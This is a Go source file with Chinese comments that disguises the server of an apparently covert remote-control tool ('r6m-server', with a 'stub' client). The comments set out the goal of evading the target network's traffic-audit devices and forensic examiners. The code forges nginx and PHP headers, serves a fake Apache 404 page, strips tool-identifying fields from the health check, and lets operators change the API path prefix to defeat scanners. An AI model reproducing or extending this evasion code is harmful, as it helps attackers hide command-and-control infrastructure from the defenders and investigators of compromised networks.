package main

// ═══════════════════════════════════════════════════════════════════════════
// netspoof.go —— 服务端标识伪装层
//
// 管理端（服务端）与"兼容性适配"的关系：
//   一套 —— 那些机制针对的是"文件被投放到敌对环境"这个前提。
//   它真正需要的是**服务端标识伪装**，因为服务端会被两类观察者看到：
//     ① 受管端所在网络的流量审计设备（看 HTTP/TLS 响应）
//     ② 拿到服务端磁盘的取证者（看二进制里的字符串）
//
// 本文件只处理 ① 里"能被扫描器直接读到"的部分：
//   · net/http 默认会加 `Server:` 相关特征，且 Go 的响应头顺序/默认行为
//     与常见 Web 服务器（nginx/IIS）不同 —— 这是低成本的强标识
//   · /api/health 会回 {"service":"r6m-server","version":"1.0.0"}，
//     任何人 curl 一下就知道这是什么工具
//   · URL 路径固定为 /api/... —— 属于"语义标识"，扫描器按路径字典打
//   · 自签证书主体写着 r6m-server / RemoteIPv6Manager
//
// 设计原则（与客户端兼容层一致）：
//   伪装必须"像真的"而不是"什么都不发"。一个只回 200、没有任何服务器头、
//   没有常见安全头的 HTTPS 服务，比一个自称 nginx 的服务更可疑。
// ═══════════════════════════════════════════════════════════════════════════

import (
	"crypto/rand"
	"encoding/hex"
	"net/http"
	"os"
	"strings"
)

// ── 路由前缀 ────────────────────────────────────────────────────────────────
// 默认 "api" 保持与现有客户端兼容（客户端里路径是硬编码的 /api/...）。
// 需要更隐蔽时用环境变量换掉前缀，并把同样的值编译进客户端
// （StubCore.cpp 的 API 路径常量）。
//
// 注意：这是**字符串拼接**得到的路径，不是随机化 —— 随机化会让客户端与服务端
// 无法约定，除非两侧共享同一个种子。当前实现选择了"可配置的固定前缀"，
// 理由是它零风险、可预测，且足以让按 /api/ 打字典的扫描器失效。
func apiPrefix() string {
	p := strings.Trim(os.Getenv("RMM_PATH_PREFIX"), "/")
	if p == "" {
		p = "api"
	}
	return "/" + p + "/"
}

// routePath 把逻辑路由名拼成实际路径，例如 routePath("health") -> "/api/health"
func routePath(name string) string {
	return apiPrefix() + name
}

// ── 响应头伪装 ──────────────────────────────────────────────────────────────
// serverTokens 的值刻意选"极其常见且互相一致"的组合。
// 只写一个 Server: nginx 而其余头全缺，反而与真 nginx 不一致，是更好的标识。
var serverTokens = []struct{ k, v string }{
	{"Server", "nginx"},
	{"X-Powered-By", "PHP/8.1.27"},
	{"X-Content-Type-Options", "nosniff"},
	{"X-Frame-Options", "SAMEORIGIN"},
	{"Referrer-Policy", "strict-origin-when-cross-origin"},
}

// spoofMiddleware 在处理器写出响应之前把特征头补齐/覆盖。
//
// 实现要点：必须用"包装 ResponseWriter"的方式，而不能在 mux 之前
// w.Header().Set(...) —— 那样只有在处理器还没 WriteHeader 时才有效，
// 而真实处理器（writeJSON / 文件下载）会显式 WriteHeader，覆盖顺序不可控。
// 包装体的写法保证无论处理器怎么写，最终写出的头都由这里兜住。
func spoofMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		sw := &spoofWriter{ResponseWriter: w, wrote: false}
		next.ServeHTTP(sw, r)
	})
}

type spoofWriter struct {
	http.ResponseWriter
	wrote bool
}

// 先把伪装头写进去，再交给真实头（真实头里同名的会被后写的覆盖）
func (s *spoofWriter) applySpoof() {
	h := s.ResponseWriter.Header()
	for _, t := range serverTokens {
		// 已经由处理器显式设置过的头不覆盖（例如 Content-Disposition）
		if t.k == "X-Powered-By" || t.k == "Server" {
			h.Set(t.k, t.v)
			continue
		}
		if h.Get(t.k) == "" {
			h.Set(t.k, t.v)
		}
	}
}

func (s *spoofWriter) WriteHeader(code int) {
	if !s.wrote {
		s.applySpoof()
		s.wrote = true
	}
	s.ResponseWriter.WriteHeader(code)
}

func (s *spoofWriter) Write(b []byte) (int, error) {
	if !s.wrote {
		s.applySpoof()
		s.wrote = true
	}
	return s.ResponseWriter.Write(b)
}

// ── 无特征的回包体 ──────────────────────────────────────────────────────────
// 原来 /api/health 回 {"ok":true,"service":"r6m-server","version":"1.0.0"} ——
// 任何扫描器 curl 一次就能归因。现在回一个"像普通站点健康检查"的形状。
//
// 为什么还要带 ok:true：客户端在两阶段连接里靠它判断 TLS 标识探测成功
// （见 StubCore.cpp 的 probeAndVerifyPin）。字段名保持不变以免破坏兼容，
// 但去掉服务名与版本号 —— 那两项没有任何功能用途，纯粹是标识。
func healthBody() map[string]interface{} {
	return map[string]interface{}{"ok": true, "status": "healthy"}
}

// ── 随机页脚/杂讯（可选）────────────────────────────────────────────────────
// 目的：让 404 / 405 之类的错误页不要呈现"Go net/http default"的固定形状。
// 一个真实的 Web 服务器在打不通的路径上通常返回带站点特征的 404 页。
func noisePage(code int) string {
	// 固定但"像某个 CMS"的模板；不引入随机内容，避免每次响应字节不同而变成新标识
	switch code {
	case 404:
		return "<!DOCTYPE html><html><head><title>404 Not Found</title></head>" +
			"<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p>" +
			"<hr><address>Apache/2.4.58 (Win64) Server at localhost Port 443</address></body></html>"
	default:
		var b [8]byte
		_, _ = rand.Read(b[:])
		return "<!-- " + hex.EncodeToString(b[:]) + " -->"
	}
}
